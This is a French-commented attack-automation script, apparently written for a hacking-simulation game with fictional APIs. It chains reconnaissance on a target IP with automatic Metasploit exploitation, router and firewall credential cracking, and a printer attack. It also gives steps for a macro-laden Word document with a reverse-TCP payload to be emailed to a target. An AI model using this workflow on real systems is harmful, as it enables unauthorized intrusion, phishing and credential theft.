
/**
 * @app-description MULTI DEEP Search IP and AUTO EXPLOIT/METASPLOIT.
 */
await FileSystem.SetPath("/", { absolute: true });
async function Main() {





  const ipset = Shell.GetArgs();

  let ip: string;



  if (ipset[0] === undefined) {

    ip = await prompt("Entrez l'adresse IP : ");
  } else {
    ip = ipset[0];
  }

  if (!Networking.IsIp(ip)) {
    ;
    throw println("ERREUR IP");

  };

  Shell.lock()
  println("DEEP IP SEARCH BY CROMU");

  await Shell.Process.exec("python3 ./net_tree.py " + ip);
  await Shell.Process.exec("geoip " + ip)
  await Shell.Process.exec("python3 ./pyUserEnum.py " + ip)
  await Shell.Process.exec("whois " + ip);
  await Shell.Process.exec("dig " + ip);

  if (await NTLM.Check(ip)) {
    println("NTLM does support on server.");



    await Shell.Process.exec("node /ntlm-hack-tool/ntlm-hack.ts " + ip)

  }


  println("Récupération des informations du sous-réseau...");
  const subnet = await Networking.GetSubnet(ip);

  if (!subnet) throw println("Erreur : échec de la récupération des informations du sous-réseau !");


  println(`Sous-réseau : ${subnet.ip}/${subnet.lanIp}`);

  const type = (subnet as any).type;




  if (type === "ROUTER") {

    println("\n==============================");
    println("======This is a Routeur NO PORT to Hack launching  Fern =====");
    println("=====Use " + ip + " in Browser and copy/paste Router Model  2 TIMES====")
    await Shell.Process.exec("/home/MASTER/desktop/Firebear Browser ")
    const model = await prompt("Entrez MODEL ROUTER : ");
    await Shell.Process.exec("python3 /fern.py " + ip + model);
    println("=======    then   copy  admin/password in browser=======");
    println("==========End Routeur exploit======="); throw ""
    println("==============================\n");
  }

  if (type === "FIREWALL") {
    let answer: string; let temp: string
    println("\n==============================");
    println("======This is a FIREWALL NO PORT to Hack ... =====");
    answer = await prompt("CONTINUE CRACKING WITH KIMAI  YES or NO : ")
    if (answer === "YES") {
      await Shell.Process.exec("/home/MASTER/desktop/Wireshark")
      println("====IN WIRESHARK :SOURCE et DEST * et * then START Puis appuyer sur enter UNTIL GREEN: ==== ");
      temp = await prompt("                ");
      await firewallstuff(ip);
    } else {
      println("==========End EXIT EXIT======="); throw ""
    }
  }



  println("Récupération des ports...");


  const portNumbers = await subnet.GetPorts();

  if (type === "PRINTER") { await printerstuff(subnet, ip, portNumbers); }


  if (!portNumbers.length) {
    println("Erreur : aucun port trouvé !    (try Reverse TCP if mail ok)");
    //  WIP WIP WIP   TRY Worm Reverse TCP await metatcp

    const tcpchoix = await prompt("USE METAEXPLOIT REVERSE TCP Y/N : ");
    if (tcpchoix === "Y") { await metatcp() }
    println("END END DEEP MODULE ");
    throw ("EXIT")
  }

  println(`Ports disponibles : ${portNumbers.join(", ")}`);

  if (await NTLM.Check(ip)) { throw println("END OF NTLM EXIT") };



  await Shell.Process.exec("nmap " + ip + " -sV")

  //// check port
  const choix = await prompt("CHOOSE  PORT for Metasploit OR 0 for EXIT : ")
  const portchoix = Number(choix);

  if (isNaN(portchoix)) {
    throw println("====== EXIT ERREUR EXIT ========");
  }
  if (portchoix === 0) {
    throw println("======= EXIT EXIT EXIT ========");
  }

  const isOpen = await subnet.PingPort(portchoix);

  if (isOpen !== true) {
    throw println("===========CLOSED OR UNREACHABLE PORT    EXIT EXIT EXIT ==========");
  }
  ///METASPLOIT



  const port = await subnet.GetPortData(portchoix);
  function newWindow(title: string) {
    println("\n==============================");
    println("=== " + title);
    println("==============================\n");
  }
  newWindow("Lancement de METASPLOIT...");






  //////Auto Metaexploit
  async function autoMetasploit(ip, port) {
    await FileSystem.SetPath("/", { absolute: true });

    const msf = GetMetasploit();

    // 1. Recherche automatique
    println("Recherche d’un module pour : " + port.service);
    const results = await msf.Search(port.service);

    if (results.length === 0) {
      println("Aucun module trouvé pour ce service.");
      return;
    }


    println("Modules trouvés :");
    results.forEach((mod, i) => {
      println(`${i + 1}. ${mod.name}  |  type: ${mod.type}  |  rank: ${mod.rank}`);
    });

    println("Modules trouvés :");




    // Si un seul module → sélection automatique
    if (results.length === 1) {
      const moduleName = results[0].name;
      println(`Un seul module détecté : ${moduleName}`);
      await msf.Use(moduleName);
      println("Module chargé automatiquement.");
    }
    else {
      // Sinon → prompt utilisateur
      const choice = await prompt("Sélectionne un module (numéro) : ");
      const index = parseInt(choice) - 1;

      if (isNaN(index) || index < 0 || index >= results.length) {
        println("Sélection invalide.");
        return;
      }

      const moduleName = results[index].name;
      println("Module sélectionné : " + moduleName);

      await msf.Use(moduleName);
      println("Module chargé.");
    }




    sleep(2000)
    // 3. Options
    const opts = msf.GetOptions();
    println("Options du module :");
    for (const o of opts) println("- " + o.name);

    // 4. Configuration automatique
    println("Configuration des options...");

    try { await msf.SetOption("RHOST", ip); } catch { }
    try { await msf.SetOption("RPORT", portchoix); } catch { }

    // Gestion spéciale de VERSION
    const cleanVersion = extractVersion(port.version);
    if (cleanVersion) {
      try {
        await msf.SetOption("version", cleanVersion);
        println("VERSION définie sur : " + cleanVersion);
      } catch {
        println("VERSION non requise par ce module.");
      }
    } else {
      println("Impossible d’extraire un numéro de version.");
    }

    // 5. Exploit

    function newWindow(title: string) {
      println("\n==============================");
      println("=== " + title);
      println("==============================\n");
    }
    newWindow("Lancement de l’exploit...");

    sleep(2000)
    await msf.Exploit();


    println("\n==============================");
    println("=== Exploit terminé  ===");
    println("=====use EXPLORER in Meterpreter=====")
    println("====Or Check For Fail Backdoor service ======")
    println("==============================\n");
    await FileSystem.SetPath("/", { absolute: true });

  }

  autoMetasploit(ip, port)


  function extractVersion(raw) {
    if (!raw) return null;

    // Matche 1.2.3, 2.4.57, 10.0.19045, etc.
    const match = raw.match(/\d+(?:\.\d+)+/);

    return match ? match[0] : null;
  }


}
Shell.unlock();
Main()

async function firewallstuff(ip) {
  let temp: any; let hash: any;
  println("\n==============================");
  println("===== Lancement de Kimai=========");
  await Shell.Process.exec("python3 /kimai.py " + ip);
  println("=========sending.......=======");
  temp = await prompt("==[GREEN]=====IF CAPTURE PAQUET: TYPE YES ElSE ENTER :");
  if (temp != "YES") { await firewallstuff(ip) }
  else {
    println("\n==============================");
    println("===== Select Paquet then copy HASH String #2 of Tooken (.hash.)=========");
    hash = await prompt("====PASTE HERE   :  ");
    await Shell.Process.exec("openssl " + "-dec " + hash)
    println("===== Copy " + ip + " in browser =========");
    println("===== USe admin Password decoded=========");
    println("=============CRACKED FIREWALL===========")
    println("==============================\n");
    await Shell.Process.exec("/home/MASTER/desktop/Firebear Browser ")
    throw ("EXIT");
  }

}

async function printerstuff(subnet, ip, portNumbers) {
  println("\n==============================");
  println("======This is a Printer Check PORT ... =====");


  if (!portNumbers.length) {
    println("===========CLOSED OR UNREACHABLE Raw 9100 PORT Open it in Routeur  EXIT EXIT EXIT ==========");
    throw (" ")
  };
  println("======PORT 9100 Ouvert Launching Pret.py ... =====");
  await Shell.Process.exec("python3 ./pret.py " + ip);
  println("======use PRET.PY Windows  and do stuff ... =====");
  println("======..EXIT EXIT EXIT.... =====");
  throw (" ")
}


/////Auto reverse TCp
async function metatcp() {

  const msf = GetMetasploit();

  println("Module sélectionné : office_word_macro");
  const results = await msf.Search("office_word_macro");
  const moduleName = results[0].name;
  println(`Un seul module détecté : ${moduleName}`);
  await msf.Use("exploit/multi/fileformat/office_word_macro");
  println("Module chargé automatiquement.");

  println("=============================================");
  println("=============COPY PASTE IN MFS6===============")
  println(" ==============  set payload bearos/meterpreter/reverse_tcp ");
  println("set FILENAME *******    =================");
  println("======== set LHOST 192.168.1.2 =========");
  println("============= set LPORT 4444 =================")
  println("============== uese : run =================");
  println("==================use : handler  ===================");
  println("=============== et envoie mail to target ==================");
  println("================== crtl c  quand etablie ===================");
  println("============================= END END END TCP ===================");


  await Shell.Process.exec("msfconsole");






}

